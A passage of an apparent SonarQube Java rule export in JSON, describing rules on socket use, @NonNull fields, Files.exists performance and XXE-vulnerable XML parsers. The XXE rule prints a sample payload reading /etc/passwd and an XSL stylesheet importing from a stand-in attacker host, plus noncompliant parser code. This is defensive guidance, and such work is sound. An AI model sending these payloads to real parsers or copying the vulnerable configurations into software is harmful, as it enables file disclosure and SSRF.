questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>\n  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> any input read from the socket. </li>\n  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === java.net ===\nimport java.net.Socket;\nimport java.net.InetAddress;\nimport java.net.Proxy;\nimport java.net.ServerSocket;\nimport javax.net.SocketFactory;\n\nclass A {\n    void foo(SocketFactory factory, String address, int port, InetAddress localAddr, int localPort, boolean stream,\n            String host, Proxy proxy, int backlog, InetAddress bindAddr)\n            throws Exception {\n        new Socket(); // Sensitive.\n        new Socket(address, port); // Sensitive.\n        new Socket(address, port, localAddr, localPort); // Sensitive.\n        new Socket(host, port, stream); // Sensitive.\n        new Socket(proxy); // Sensitive.\n        new Socket(host, port); // Sensitive.\n        new Socket(host, port, stream); // Sensitive.\n        new Socket(host, port, localAddr, localPort); // Sensitive.\n\n        new ServerSocket(); // Sensitive.\n        new ServerSocket(port); // Sensitive.\n        new ServerSocket(port, backlog); // Sensitive.\n        new ServerSocket(port, backlog, bindAddr); // Sensitive.\n\n        factory.createSocket(); // Sensitive\n    }\n}\n\nabstract class mySocketFactory extends SocketFactory { // Sensitive. Review how the sockets are created.\n    // ...\n}\n</pre>\n<pre>\n// === java.nio.channels ===\nimport java.net.SocketAddress;\nimport java.nio.channels.AsynchronousChannelGroup;\nimport java.nio.channels.AsynchronousServerSocketChannel;\nimport java.nio.channels.AsynchronousSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.channels.ServerSocketChannel;\n\nclass A {\n    void foo(AsynchronousChannelGroup group, SocketAddress remote) throws Exception {\n        AsynchronousServerSocketChannel.open(); // Sensitive.\n        AsynchronousServerSocketChannel.open(group); // Sensitive.\n        AsynchronousSocketChannel.open(); // Sensitive.\n        AsynchronousSocketChannel.open(group); // Sensitive.\n        SocketChannel.open(); // Sensitive.\n        SocketChannel.open(remote); // Sensitive.\n        ServerSocketChannel.open(); // Sensitive.\n    }\n}\n</pre>\n<pre>\n// === Netty ===\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.socket.ServerSocketChannel;\nimport io.netty.channel.socket.SocketChannel;\n\nclass CustomChannelInitializer extends ChannelInitializer&lt;ServerSocketChannel&gt; { // Sensitive. Review how the SocketChannel is used.\n    @Override\n    protected void initChannel(ServerSocketChannel ch) throws Exception {\n    }\n}\n\nclass A {\n    void foo() {\n        new ChannelInitializer&lt;SocketChannel&gt;() {  // Sensitive\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                // ...\n            }\n        };\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/20\">MITRE, CWE-20</a> - Improper Input Validation </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/400\">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/200\">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat2\">SANS Top 25</a> - Risky Resource Management </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2637",
            "repo": "java",
            "name": "\"@NonNull\" values should not be set to null",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Fields, parameters and return values marked <code>@NotNull</code>, <code>@NonNull</code>, or <code>@Nonnull</code> are assumed to have non-null\nvalues and are not typically null-checked before use. Therefore setting one of these values to <code>null</code>, or failing to set such a class field\nin a constructor, could cause <code>NullPointerException</code>s at runtime.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MainClass {\n\n  @Nonnull\n  private String primary;\n  private String secondary;\n\n  public MainClass(String color) {\n    if (color != null) {\n      secondary = null;\n    }\n    primary = color;  // Noncompliant; \"primary\" is Nonnull but could be set to null here\n  }\n\n  public MainClass() { // Noncompliant; \"primary\" Nonnull\" but is not initialized\n  }\n\n  @Nonnull\n  public String indirectMix() {\n    String mix = null;\n    return mix;  // Noncompliant; return value is Nonnull, but null is returned.}}\n  }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/476.html\">MITRE CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>",
            "mdDesc": "<p>Fields, parameters and return values marked <code>@NotNull</code>, <code>@NonNull</code>, or <code>@Nonnull</code> are assumed to have non-null\nvalues and are not typically null-checked before use. Therefore setting one of these values to <code>null</code>, or failing to set such a class field\nin a constructor, could cause <code>NullPointerException</code>s at runtime.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MainClass {\n\n  @Nonnull\n  private String primary;\n  private String secondary;\n\n  public MainClass(String color) {\n    if (color != null) {\n      secondary = null;\n    }\n    primary = color;  // Noncompliant; \"primary\" is Nonnull but could be set to null here\n  }\n\n  public MainClass() { // Noncompliant; \"primary\" Nonnull\" but is not initialized\n  }\n\n  @Nonnull\n  public String indirectMix() {\n    String mix = null;\n    return mix;  // Noncompliant; return value is Nonnull, but null is returned.}}\n  }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/476.html\">MITRE CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3725",
            "repo": "java",
            "name": "Java 8's \"Files.exists\" should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The <code>Files.exists</code> method has noticeably poor performance in JDK 8, and can slow an application significantly when used to check files\nthat don't actually exist. </p>\n<p>The same goes for <code>Files.notExists</code>, <code>Files.isDirectory</code> and <code>Files.isRegularFile</code> from <code>java.nio.file</code>\npackage.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is not 8.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPath myPath;\nif(java.nio.file.Files.exists(myPath)) {  // Noncompliant\n // do something\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPath myPath;\nif(myPath.toFile().exists())) {\n // do something\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://bugs.openjdk.java.net/browse/JDK-8153414\">https://bugs.openjdk.java.net/browse/JDK-8153414</a> </li>\n  <li> <a href=\"https://bugs.openjdk.java.net/browse/JDK-8154077\">https://bugs.openjdk.java.net/browse/JDK-8154077</a> </li>\n</ul>",
            "mdDesc": "<p>The <code>Files.exists</code> method has noticeably poor performance in JDK 8, and can slow an application significantly when used to check files\nthat don't actually exist. </p>\n<p>The same goes for <code>Files.notExists</code>, <code>Files.isDirectory</code> and <code>Files.isRegularFile</code> from <code>java.nio.file</code>\npackage.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is not 8.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPath myPath;\nif(java.nio.file.Files.exists(myPath)) {  // Noncompliant\n // do something\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPath myPath;\nif(myPath.toFile().exists())) {\n // do something\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://bugs.openjdk.java.net/browse/JDK-8153414\">https://bugs.openjdk.java.net/browse/JDK-8153414</a> </li>\n  <li> <a href=\"https://bugs.openjdk.java.net/browse/JDK-8154077\">https://bugs.openjdk.java.net/browse/JDK-8154077</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8",
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2755",
            "repo": "java",
            "name": "XML parsers should not be vulnerable to XXE attacks",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><a href=\"https://www.w3.org/TR/xml/\">XML specification</a> allows the use of entities that can be <a\nhref=\"https://www.w3.org/TR/xml/#sec-internal-ent\">internal</a> or <a href=\"https://www.w3.org/TR/xml/#sec-external-ent\">external</a> (file system /\nnetwork access ...) which could lead to vulnerabilities such as confidential file disclosures or <a\nhref=\"https://www.owasp.org/index.php/Server_Side_Request_Forgery\">SSRFs</a>.</p>\n<p>Example in this XML document, an external entity read the /etc/passwd file:</p>\n<pre>\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n  &lt;!DOCTYPE test [\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n  ]&gt;\n&lt;note xmlns=\"http://www.w3schools.com\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n  &lt;to&gt;&amp;xxe;&lt;/to&gt;\n  &lt;from&gt;Jani&lt;/from&gt;\n  &lt;heading&gt;Reminder&lt;/heading&gt;\n  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;\n&lt;/note&gt;\n</pre>\n<p>In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:</p>\n<pre>\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.attacker.com/evil.xsl\"&gt;\n  &lt;xsl:import href=\"http://www.attacker.com/evil.xsl\"/&gt;\n  &lt;xsl:include href=\"http://www.attacker.com/evil.xsl\"/&gt;\n &lt;xsl:template match=\"/\"&gt;\n  &amp;content;\n &lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</pre>\n<p>It is recommended to disable access to external entities and network access in general.</p>\n<p>To protect Java XML Parsers from XXE attacks <a\nhref=\"https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-94ABC0EE-9DC8-44F0-84AD-47ADD5340477\">these\nproperties</a> have been defined since JAXP 1.5:</p>\n<ul>\n  <li> ACCESS_EXTERNAL_DTD: should be set to \"\" when processing XML/XSD/XLS files (it looks for external DOCTYPEs) </li>\n  <li> ACCESS_EXTERNAL_SCHEMA: should be set to \"\" when processing XML/XSD/XLS files (it looks for external schemalocation ect) </li>\n  <li> ACCESS_EXTERNAL_STYLESHEET should be set to \"\" when processing XLS file (it looks for external imports, includes ect); </li>\n</ul>\n<p>Note that <a href=\"http://xerces.apache.org/xerces2-j/\">Apache Xerces</a> is still based on JAXP 1.4, therefore one solution is to set to\n<code>false</code> the <a href=\"http://xerces.apache.org/xerces2-j/features.html#external-general-entities\">external-general-entities</a> feature.</p>\n<p>Avoid FEATURE_SECURE_PROCESSING feature to protect from XXE attacks because depending on the implementation:</p>\n<ul>\n  <li> it has <a\n  href=\"https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-88B04BE2-35EF-4F61-B4FA-57A0E9102342\">no effect</a> to protect the parser from XXE attacks but helps guard against excessive memory consumption from XML processing. </li>\n  <li> or it's just an obscur shortcut (it could set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to \"\" but without guarantee). </li>\n</ul>\n<h2>Noncompliant Code Examples</h2>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilderFactory</a> library:</p>\n<pre>\nString xml = \"xxe.xml\";\nDocumentBuilderFactory df = DocumentBuilderFactory.newInstance();  // Noncompliant\nDocumentBuilder builder = df.newDocumentBuilder();\nDocument document = builder.parse(new InputSource(xml));\nDOMSource domSource = new DOMSource(document);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html\">SAXParserFactory</a> library:</p>\n<pre>\nString xml = \"xxe.xml\";\nSaxHandler handler = new SaxHandler();\nSAXParserFactory factory = SAXParserFactory.newInstance();\nSAXParser parser = factory.newSAXParser();  // Noncompliant\nparser.parse(xml, handler);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html\">XMLInputFactory</a> library:</p>\n<pre>\nXMLInputFactory factory = XMLInputFactory.newInstance();  // Noncompliant\nXMLEventReader eventReader = factory.createXMLEventReader(new FileReader(\"xxe.xml\"));\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html\">TransformerFactory</a> library:</p>\n<pre>\nString xslt = \"xxe.xsl\";\nString xml = \"xxe.xml\";\nTransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();  // Noncompliant\nTransformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));\n\nStringWriter writer = new StringWriter();\ntransformer.transform(new StreamSource(xml), new StreamResult(writer));\nString result = writer.toString();\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html\">SchemaFactory</a> library:</p>\n<pre>\nString xsd = \"xxe.xsd\";\nStreamSource xsdStreamSource = new StreamSource(xsd);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);  // Noncompliant\nSchema schema = schemaFactory.newSchema(xsdStreamSource);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html\">Validator</a> library:</p>\n<pre>\nString xsd = \"xxe.xsd\";\nString xml = \"xxe.xml\";\nStreamSource xsdStreamSource = new StreamSource(xsd);\nStreamSource xmlStreamSource = new StreamSource(xml);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nSchema schema = schemaFactory.newSchema(xsdStreamSource);\nValidator validator = schema.newValidator();   // Noncompliant\n\nStringWriter writer = new StringWriter();\nvalidator.validate(xmlStreamSource, new StreamResult(writer));\n</pre>\n<p><a href=\"https://dom4j.github.io/\">Dom4j</a> library:</p>\n<pre>\nSAXReader xmlReader = new SAXReader(); // Noncompliant by default\nDocument xmlResponse = xmlReader.read(xml);\n</pre>\n<p><a href=\"http://www.jdom.org/\">Jdom2</a> library:</p>\n<pre>\nSAXBuilder builder = new SAXBuilder(); // Noncompliant by default\nDocument document = builder.build(new File(xml));\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilderFactory</a> library:</p>\n<pre>\nString xml = \"xxe.xml\";\nDocumentBuilderFactory df = DocumentBuilderFactory.newInstance();\ndf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\ndf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); // compliant\nDocumentBuilder builder = df.newDocumentBuilder();\nDocument document = builder.parse(new InputSource(xml));\nDOMSource domSource = new DOMSource(document);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html\">SAXParserFactory</a> library:</p>\n<pre>\nString xml = \"xxe.xml\";\nSaxHandler handler = new SaxHandler();\nSAXParserFactory factory = SAXParserFactory.newInstance();\nSAXParser parser = factory.newSAXParser();\nparser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\nparser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); // compliant\nparser.parse(xml, handler);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html\">XMLInputFactory</a> library:</p>\n<pre>\nXMLInputFactory factory = XMLInputFactory.newInstance();\nfactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\nfactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");  // compliant\n\nXMLEventReader eventReader = factory.createXMLEventReader(new FileReader(\"xxe.xml\"));\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html\">TransformerFactory</a> library:</p>\n<pre>\nString xslt = \"xxe.xsl\";\nString xml = \"xxe.xml\";\nTransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();\ntransformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\ntransformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); // Compliant\n// ACCESS_EXTERNAL_SCHEMA not supported in several TransformerFactory implementations\nTransformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));\n\nStringWriter writer = new StringWriter();\ntransformer.transform(new StreamSource(xml), new StreamResult(writer));\nString result = writer.toString();\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html\">SchemaFactory</a> library:</p>\n<pre>\nString xsd = \"xxe.xsd\";\nStreamSource xsdStreamSource = new StreamSource(xsd);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nschemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); // Compliant\nschemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\nSchema schema = schemaFactory.newSchema(xsdStreamSource);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html\">Validator</a> library:</p>\n<pre>\nString xsd = \"xxe.xsd\";\nString xml = \"xxe.xml\";\nStreamSource xsdStreamSource = new StreamSource(xsd);\nStreamSource xmlStreamSource = new StreamSource(xml);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nSchema schema = schemaFactory.newSchema(xsdStreamSource);\nschemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\nschemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\n// validators will also inherit of these properties\nValidator validator = schema.newValidator();\n\nvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");   // Compliant\nvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");   // Compliant\n\nStringWriter writer = new StringWriter();\nvalidator.validate(xmlStreamSource, new StreamResult(writer));\n</pre>\n<p>For <a href=\"https://dom4j.github.io/\">dom4j</a> library, ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA are not supported, thus a very strict fix\nis to disable doctype declarations:</p>\n<pre>\nSAXReader xmlReader = new SAXReader();\nxmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); // Compliant\nDocument xmlResponse = xmlReader.read(xml);\n</pre>\n<p><a href=\"http://www.jdom.org/\">Jdom2</a> library:</p>\n<pre>\nSAXBuilder builder = new SAXBuilder(); // Compliant\nbuilder.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\nbuilder.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); // Compliant\nDocument document = builder.build(new File(xml));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)\">OWASP Top 10 2017 Category A4</a> - XML External Entities\n  (XXE) </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java\">OWASP XXE Prevention Cheat\n  Sheet</a> </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/611.html\">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/827.html\">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li>\n</ul>",
            "mdDesc": "<p><a href=\"https://www.w3.org/TR/xml/\">XML specification</a> allows the use of entities that can be <a\nhref=\"https://www.w3.org/TR/xml/#sec-internal-ent\">internal</a> or <a href=\"https://www.w3.org/TR/xml/#sec-external-ent\">external</a> (file system /\nnetwork access ...) which could lead to vulnerabilities such as confidential file disclosures or <a\nhref=\"https://www.owasp.org/index.php/Server_Side_Request_Forgery\">SSRFs</a>.</p>\n<p>Example in this XML document, an external entity read the /etc/passwd file:</p>\n<pre>\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n  &lt;!DOCTYPE test [\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n  ]&gt;\n&lt;note xmlns=\"http://www.w3schools.com\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n  &lt;to&gt;&amp;xxe;&lt;/to&gt;\n  &lt;from&gt;Jani&lt;/from&gt;\n  &lt;heading&gt;Reminder&lt;/heading&gt;\n  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;\n&lt;/note&gt;\n</pre>\n<p>In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:</p>\n<pre>\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.attacker.com/evil.xsl\"&gt;\n  &lt;xsl:import href=\"http://www.attacker.com/evil.xsl\"/&gt;\n  &lt;xsl:include href=\"http://www.attacker.com/evil.xsl\"/&gt;\n &lt;xsl:template match=\"/\"&gt;\n  &amp;content;\n &lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</pre>\n<p>It is recommended to disable access to external entities and network access in general.</p>\n<p>To protect Java XML Parsers from XXE attacks <a\nhref=\"https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-94ABC0EE-9DC8-44F0-84AD-47ADD5340477\">these\nproperties</a> have been defined since JAXP 1.5:</p>\n<ul>\n  <li> ACCESS_EXTERNAL_DTD: should be set to \"\" when processing XML/XSD/XLS files (it looks for external DOCTYPEs) </li>\n  <li> ACCESS_EXTERNAL_SCHEMA: should be set to \"\" when processing XML/XSD/XLS files (it looks for external schemalocation ect) </li>\n  <li> ACCESS_EXTERNAL_STYLESHEET should be set to \"\" when processing XLS file (it looks for external imports, includes ect); </li>\n</ul>\n<p>Note that <a href=\"http://xerces.apache.org/xerces2-j/\">Apache Xerces</a> is still based on JAXP 1.4, therefore one solution is to set to\n<code>false</code> the <a href=\"http://xerces.apache.org/xerces2-j/features.html#external-general-entities\">external-general-entities</a> feature.</p>\n<p>Avoid FEATURE_SECURE_PROCESSING feature to protect from XXE attacks because depending on the implementation:</p>\n<ul>\n  <li> it has <a\n  href=\"https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-88B04BE2-35EF-4F61-B4FA-57A0E9102342\">no effect</a> to protect the parser from XXE attacks but helps guard against excessive memory consumption from XML processing. </li>\n  <li> or it's just an obscur shortcut (it could set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to \"\" but without guarantee). </li>\n</ul>\n<h2>Noncompliant Code Examples</h2>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilderFactory</a> library:</p>\n<pre>\nString xml = \"xxe.xml\";\nDocumentBuilderFactory df = DocumentBuilderFactory.newInstance();  // Noncompliant\nDocumentBuilder builder = df.newDocumentBuilder();\nDocument document = builder.parse(new InputSource(xml));\nDOMSource domSource = new DOMSource(document);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html\">SAXParserFactory</a> library:</p>\n<pre>\nString xml = \"xxe.xml\";\nSaxHandler handler = new SaxHandler();\nSAXParserFactory factory = SAXParserFactory.newInstance();\nSAXParser parser = factory.newSAXParser();  // Noncompliant\nparser.parse(xml, handler);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html\">XMLInputFactory</a> library:</p>\n<pre>\nXMLInputFactory factory = XMLInputFactory.newInstance();  // Noncompliant\nXMLEventReader eventReader = factory.createXMLEventReader(new FileReader(\"xxe.xml\"));\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html\">TransformerFactory</a> library:</p>\n<pre>\nString xslt = \"xxe.xsl\";\nString xml = \"xxe.xml\";\nTransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();  // Noncompliant\nTransformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));\n\nStringWriter writer = new StringWriter();\ntransformer.transform(new StreamSource(xml), new StreamResult(writer));\nString result = writer.toString();\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html\">SchemaFactory</a> library:</p>\n<pre>\nString xsd = \"xxe.xsd\";\nStreamSource xsdStreamSource = new StreamSource(xsd);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);  // Noncompliant\nSchema schema = schemaFactory.newSchema(xsdStreamSource);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html\">Validator</a> library:</p>\n<pre>\nString xsd = \"xxe.xsd\";\nString xml = \"xxe.xml\";\nStreamSource xsdStreamSource = new StreamSource(xsd);\nStreamSource xmlStreamSource = new StreamSource(xml);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nSchema schema = schemaFactory.newSchema(xsdStreamSource);\nValidator validator = schema.newValidator();   // Noncompliant\n\nStringWriter writer = new StringWriter();\nvalidator.validate(xmlStreamSource, new StreamResult(writer));\n</pre>\n<p><a href=\"https://dom4j.github.io/\">Dom4j</a> library:</p>\n<pre>\nSAXReader xmlReader = new SAXReader(); // Noncompliant by default\nDocument xmlResponse = xmlReader.read(xml);\n</pre>\n<p><a href=\"http://www.jdom.org/\">Jdom2</a> library:</p>\n<pre>\nSAXBuilder builder = new SAXBuilder(); // Noncompliant by default\nDocument document = builder.build(new File(xml));\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilderFactory</a> library:</p>\n<pre>\nString xml = \"xxe.xml\";\nDocumentBuilderFactory df = DocumentBuilderFactory.newInstance();\ndf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\ndf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); // compliant\nDocumentBuilder builder = df.newDocumentBuilder();\nDocument document = builder.parse(new InputSource(xml));\nDOMSource domSource = new DOMSource(document);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html\">SAXParserFactory</a> library:</p>\n<pre>\nString xml = \"xxe.xml\";\nSaxHandler handler = new SaxHandler();\nSAXParserFactory factory = SAXParserFactory.newInstance();\nSAXParser parser = factory.newSAXParser();\nparser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\nparser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); // compliant\nparser.parse(xml, handler);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html\">XMLInputFactory</a> library:</p>\n<pre>\nXMLInputFactory factory = XMLInputFactory.newInstance();\nfactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\nfactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");  // compliant\n\nXMLEventReader 